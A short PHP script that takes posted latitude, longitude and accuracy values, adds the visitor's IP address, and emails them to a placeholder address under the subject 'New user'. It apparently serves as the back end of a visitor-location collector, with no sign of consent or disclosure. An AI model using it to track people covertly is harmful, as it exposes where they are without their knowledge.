<?php

mb_internal_encoding('UTF-8');

if($_SERVER["CONTENT_TYPE"] ==  'application/json') {
    $data = file_get_contents('php://input');
    $coordinates = json_decode($data, true);

    if(isset($coordinates['lat'], $coordinates['lon'], $coordinates['accuracy'])) {
        $msg = 'lat: ' . floatval($coordinates['lat']) . "\n" .
            'lon: ' . floatval($coordinates['lon']) . "\n" .
            'acc: ' . intval($coordinates['accuracy']) . "\n" .
            'ip: ' . $_SERVER['REMOTE_ADDR'];
            //enter your email below
        mail('yourLoginName@mail.com', 'New user', $msg);
    }
}
